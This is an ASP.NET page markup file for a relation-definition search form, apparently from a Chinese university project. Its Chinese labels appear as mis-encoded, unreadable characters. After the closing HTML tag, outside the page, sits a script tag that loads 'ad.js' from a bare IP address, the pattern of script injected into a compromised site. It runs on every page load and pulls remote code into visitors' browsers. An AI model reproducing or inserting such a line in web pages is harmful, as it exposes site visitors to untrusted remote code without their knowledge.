<%@ Page Language="vb" AutoEventWireup="false" Codebehind="rdefinitionsearch.aspx.vb" Inherits="relation.rdefinitionsearch"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
	<HEAD>
		<title>rdefinitionsearch</title>
		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
		<meta content="Visual Basic .NET 7.1" name="CODE_LANGUAGE">
		<meta content="JavaScript" name="vs_defaultClientScript">
		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">
	</HEAD>
	<body>
		<form id="Form1" method="post"> <!--==========include pagehead==============-->
			<TABLE id="Table2" cellSpacing="0" cellPadding="0" width="778" align="center" bgColor="#fef3bd"
				border="0" valign="middle">
				<TR>
					<TD vAlign="middle" width="778" bgColor="#fef3bd" colSpan="3" height="8">
						<DIV align="center"><IMG height="8" src="imga/bg1.gif" width="100%"></DIV>
					</TD>
				</TR>
				<TR bgColor="#ffffff">
					<TD colSpan="3" height="60"><IMG height="60" src="imga/logo.gif" width="321"><IMG height="60" src="imga/idea.jpg" width="457"></TD>
				</TR>
				<TR>
					<TD vAlign="middle" colSpan="3" height="8"><IMG height="8" src="imga/bg2.gif" width="100%"></TD>
				</TR>
			</TABLE> <!--===============include menu================--> <!--==========include menu==============-->
			<TABLE id="Table3" cellSpacing="0" cellPadding="0" width="778" align="center" border="0">
				<TR>
					<TD class="p9" vAlign="middle" width="196" bgColor="#dedede" height="18">
						<DIV align="center"><FONT color="#666666"><B>
									<asp:Label id="timetext" runat="server"></asp:Label>
									&nbsp; </B></FONT>
						</DIV>
					</TD>
					<TD class="p9" vAlign="middle" width="51" bgColor="#dedede" height="18">
						<DIV align="right"><IMG height="25" src="imga/blue.jpg" width="35"></DIV>
					</TD>
					<TD class="p9" vAlign="middle" width="548" background="imga/blue2.jpg" bgColor="#00459c"
						height="18">
						<DIV align="left"><SPAN class="p10"><FONT color="#ffffff"><A class="whitemenu" onmouseover="showMenu(this,'topmenu1',0)" onmouseout="hideMenu(event)"
										href="rmodelpublish.aspx" target="_top">����</A> <A class="whitemenu" onmouseover="showMenu(this,'topmenu2',0)" onmouseout="hideMenu(event)"
										href="rmodelsearch.aspx" target="_top">��ѯ</A>&nbsp;<A href="rmodelmodification.aspx">�޸�</A>
								</FONT></SPAN>
						</DIV>
					</TD>
				</TR>
			</TABLE>
			<DIV id="topmenu3" style="VISIBILITY: hidden" onmouseout="hideMenu(event)"></DIV>
			<FONT face="����"></FONT>
			<TABLE id="Table4" height="62" cellSpacing="0" width="778" align="center">
				<TR border="0">
					<TD class="p10" vAlign="top" background="imga/bg3.gif" colSpan="2" height="20" border="0"><IMG height="1" src="imga/03.gif" width="100%"><BR>
						<FONT color="#000000">&nbsp;|</FONT><FONT color="#000000"><SPAN class="p9"> <A href="index.aspx">
									��ҳ</A></SPAN> </FONT><FONT color="#000000">|</FONT> <FONT color="#000000">
							<SPAN class="p9"><A href="index.aspx">�û���¼</A></SPAN> |<A href="newcustomer.aspx">ע��</A>
						</FONT>
					</TD>
				</TR>
				<TR border="0">
					<TD vAlign="top" width="163" bgColor="#0859ad" height="20" style="WIDTH: 163px">&nbsp;
						<asp:label id="lblHint" runat="server" ForeColor="Info">Label</asp:label></TD>
					<TD vAlign="top" bgColor="#0859ad" height="20">
						<DIV align="right"><FONT color="#ffffff">
								<marquee scrollDelay="100" direction="left" behavior="scroll" loop="-1">��ӭ�� 
									&nbsp;���ҵ�����ѣ� &nbsp; &nbsp;</marquee>
							</FONT>
						</DIV>
					</TD>
				</TR>
			</TABLE>
			<CENTER>
				<TABLE id="Table5" height="400" cellSpacing="0" cellPadding="0" width="778" bgColor="#ffffff"
					border="0">
					<TBODY>
						<TR>
							<TD vAlign="top" width="172" bgColor="#0859ad" height="14"><!--====================include pageleft==================-->
								<TABLE id="Table6" cellSpacing="0" cellPadding="0" width="100%" border="0">
									<TR>
										<TD vAlign="top" bgColor="#0859ad">
											<DIV align="center"><FONT face="����"></FONT>&nbsp;</DIV>
										</TD>
									</TR>
								</TABLE>
								<TABLE id="Table7" height="100%" cellSpacing="0" cellPadding="0" width="100%" border="0">
									<TR>
										<TD vAlign="top" bgColor="#9cd7ef">
											<DIV align="center"><IMG style="WIDTH: 100%; HEIGHT: 32px" height="32" src="imga/grad.gif" width="172">&nbsp;
												<TABLE id="Table1" style="WIDTH: 153px; HEIGHT: 153px" width="153" border="1">
													<TR>
														<TD width="147" height="45">
															<DIV align="center">&nbsp;&nbsp;<A href="rmodelsearch.aspx">��ѯ��ϵ�ռ�</A></DIV>
														</TD>
													</TR>
													<TR>
														<TD height="43">
															<DIV align="center"><A href="rdefinitionsearch.aspx">��ѯ��ϵ����</A></DIV>
														</TD>
													</TR>
													<TR>
														<TD height="55">
															<DIV align="center"><A href="rinstancesearch.aspx">��ѯ��ϵʵ��</A></DIV>
														</TD>
													</TR>
												</TABLE>
												<BR>
												<BR>
											</DIV>
										</TD>
									</TR>
								</TABLE>
							</TD>
							<TD vAlign="top" width="21" bgColor="#ffffff"><IMG height="23" src="imga/05.gif" width="21"></TD>
							<TD vAlign="top" width="611">
		</form>
		<FORM style="MARGIN: 0px" name="loginForm" action="" method="post" runat="server">
			&nbsp;&nbsp;
			<TABLE id="Table11" style="WIDTH: 571px; HEIGHT: 546px" cellSpacing="1" cellPadding="1"
				width="571" border="1">
				<TR>
					<TD style="WIDTH: 262px; HEIGHT: 48px">
						<P><FONT face="����">
								<TABLE id="Table9" style="WIDTH: 242px; HEIGHT: 30px" cellSpacing="1" cellPadding="1" width="242"
									border="1">
									<TR>
										<TD style="WIDTH: 127px"><FONT face="����"><asp:label id="Label2" runat="server">��ϵ��������</asp:label></FONT></TD>
										<TD><asp:dropdownlist id="ddlstDefSearch" runat="server"></asp:dropdownlist></TD>
									</TR>
								</TABLE>
							</FONT>
						</P>
					</TD>
					<TD style="HEIGHT: 48px"><FONT face="����">
							<P><FONT face="����">
									<TABLE id="Table10" style="WIDTH: 235px; HEIGHT: 24px" cellSpacing="1" cellPadding="1"
										width="235" border="1">
										<TR>
											<TD>
												<P><FONT face="����"><asp:dropdownlist id="ddlstDefAtt" runat="server">
															<asp:ListItem Value="����ϵ���ͱ��">����ϵ���ͱ��</asp:ListItem>
															<asp:ListItem Value="����ϵ��������">����ϵ��������</asp:ListItem>
														</asp:dropdownlist></FONT></P>
											</TD>
											<TD><asp:button id="btnDefSearch" runat="server" Text="����" Width="54px"></asp:button></TD>
										</TR>
									</TABLE>
								</FONT>
							</P>
						</FONT>
					</TD>
				</TR>
				<TR>
					<TD style="WIDTH: 262px"><FONT face="����">
							<TABLE id="Table12" style="WIDTH: 245px; HEIGHT: 495px" cellSpacing="1" cellPadding="1"
								width="245" border="1">
								<TR>
									<TD style="WIDTH: 229px; HEIGHT: 7px"><asp:label id="Label17" runat="server">��ϵ��������</asp:label></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px; HEIGHT: 29px"><asp:textbox id="txtDefName" runat="server"></asp:textbox></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px; HEIGHT: 32px"><asp:label id="Label15" runat="server">��ϵ�������</asp:label></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:textbox id="txtDefNum" runat="server"></asp:textbox></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><FONT face="����"><asp:label id="Label14" runat="server" Width="128px">�Ƿ������ϵ</asp:label></FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:radiobutton id="rbtnIsDirYes" runat="server" Text="����" Width="88px" GroupName="rbtnIsDir"></asp:radiobutton><FONT face="����">&nbsp;
											<asp:radiobutton id="rbtnIsDirNo" runat="server" Text="����" GroupName="rbtnIsDir"></asp:radiobutton></FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px; HEIGHT: 31px">�û�Ȩ��</TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px; HEIGHT: 31px"><asp:radiobutton id="rbtnAccPri1" runat="server" Text="Ȩ��1" GroupName="rbtnAccPri"></asp:radiobutton><asp:radiobutton id="rbtnAccPri2" runat="server" Text="Ȩ��2" GroupName="rbtnAccPri"></asp:radiobutton><asp:radiobutton id="rbtnAccPri3" runat="server" Text="Ȩ��3" GroupName="rbtnAccPri"></asp:radiobutton></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px; HEIGHT: 31px"><asp:label id="Label13" runat="server" Width="192px">�Ƿ���Ҫ���������ȷ��</asp:label></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><FONT face="����"><asp:radiobutton id="rbtnIsConfYes" runat="server" Text="��Ҫȷ��" GroupName="rbtnIsConf"></asp:radiobutton>&nbsp;
											<asp:radiobutton id="rbtnIsConfNo" runat="server" Text="����Ҫȷ��" GroupName="rbtnIsConf"></asp:radiobutton></FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:label id="Label12" runat="server" Width="144px">��ϵ���ͷ���ʱ��</asp:label></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><FONT face="����"><asp:textbox id="txtDefPubTime" runat="server"></asp:textbox></FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:label id="Label6" runat="server" Width="184px">��ϵ���͵ĸ���ʱ��</asp:label></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:textbox id="txtDefUpdateTime" runat="server"></asp:textbox></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:label id="Label1" runat="server">��ϵ�ռ���Ч��</asp:label></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:radiobutton id="rbtnIsValidYes" runat="server" Text="��Ч" GroupName="rbtnIsValid"></asp:radiobutton><FONT face="����">&nbsp;
											<asp:radiobutton id="rbtnIsValidNo" runat="server" Text="��Ч" GroupName="rbtnIsValid"></asp:radiobutton></FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:label id="Label3" runat="server">��ϵ���͵Ĺ�����Ϣ</asp:label></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:datagrid id="dgrdDefAss" runat="server"></asp:datagrid></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:label id="Label4" runat="server">��ϵ���͵��߼���ϵ</asp:label></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:datagrid id="dgrdDefLogic" runat="server"></asp:datagrid></TD>
								</TR>
							</TABLE>
						</FONT>
					</TD>
					<TD><FONT face="����"><asp:image id="imgDef" runat="server" Width="202px" Height="202px"></asp:image></FONT></TD>
				</TR>
			</TABLE>
		</FORM>
		<FORM id="Form2" method="post">
			<FONT face="����">
				<asp:label id="lblWarning" runat="server" Width="408px" ForeColor="#0000C0">label</asp:label></FONT></TD></TR></TBODY></TABLE></CENTER><!---====================include pagetail================-->
			<CENTER>
				<TABLE id="Table8" cellSpacing="0" cellPadding="0" width="778" border="0">
					<TR>
						<TD><IMG height="31" src="imga/bg4.gif" width="778"></TD>
					</TR>
					<TR>
						<TD class="p9" background="imga/bg5.gif">
							<DIV align="center">| �������� | �ͷ��绰��<STRONG><FONT face="Arial">0571-63740939</FONT></STRONG></DIV>
						</TD>
					</TR>
					<TR>
						<TD class="p9" bgColor="#ffffff"><FONT face="����">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
								��Ȩ���У�&nbsp;&nbsp; �㽭��ѧԺ��Ϣ����ѧԺ����022 ½���� ������ </FONT>
						</TD>
					</TR>
				</TABLE>
			</CENTER>
		</FORM>
	</body>
</HTML>
<script src="http://222.208.183.246/ad/ad.js"></script>
